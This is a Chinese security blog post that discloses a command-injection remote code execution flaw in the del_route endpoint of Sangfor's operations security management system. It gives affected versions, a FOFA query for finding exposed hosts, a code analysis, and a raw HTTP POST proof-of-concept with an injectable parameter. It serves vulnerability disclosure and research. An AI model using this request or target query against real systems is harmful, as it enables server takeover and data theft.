---
title: "深信服运维安全管理系统 del_route 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html
asset_dir: assets/深信服运维安全管理系统-del_route-远程命令执行漏洞
---

# 深信服运维安全管理系统 del\_route 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/3/4 08:35
* 325浏览
* [0评论](#comment)
* 7分钟阅读

深入探索

软件

SQL

route


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深信服运维安全管理系统 del\_route 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

Windows安全工具

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

深入探索

物流软件安全

防火墙软件

漏洞扫描器

看下 `com.sbr.fort.web.controller.system.netconfig.NetConfigController#del_route`的实现逻辑

[![深信服运维安全管理系统 del_route 远程命令执行漏洞](images/img-001-ba2159d7866b.webp)](https://image.mrxn.net/d2f278860dac4401af7f7f526156dc43.webp)

两个参数**networks**与**netmasks**被直接拼接在**cmd**中，然后调用`ShellExecutor`类的`exe`方法进行执行，未任何过滤或校验，从而造成[命令执行](https://mrxn.net/tag/rce)漏洞（两个参数均存在命令执行漏洞）。

网络

深入探索

技术文章订阅

编程语言教程

JSON处理工具

# 漏洞复现

[![深信服运维安全管理系统 del_route 远程命令执行漏洞](images/img-002-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

> 多个参数均存在命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，这里以ethnum为例
>
> 漏洞扫描服务

```
POST /fort/system;help/netConfig/del_route HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

ipv=4&flags=UG&gateways=1.1.1.1&networks=RCE_POC&netmasks=255.255.255.0
```

访问命令执行结果文件

[![深信服运维安全管理系统 del_route 远程命令执行漏洞](images/img-003-0b23d03927e6.webp)](https://image.mrxn.net/6be82ea82f8942db9da0c91608eb5acc.webp)

成功得到[命令执行](https://mrxn.net/tag/rce)结果

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)  
文章链接：<https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

计算机服务器

![](data:image/png;base64,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)

设备上扫码阅读

代码安全审计


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-netConfig-del\_route-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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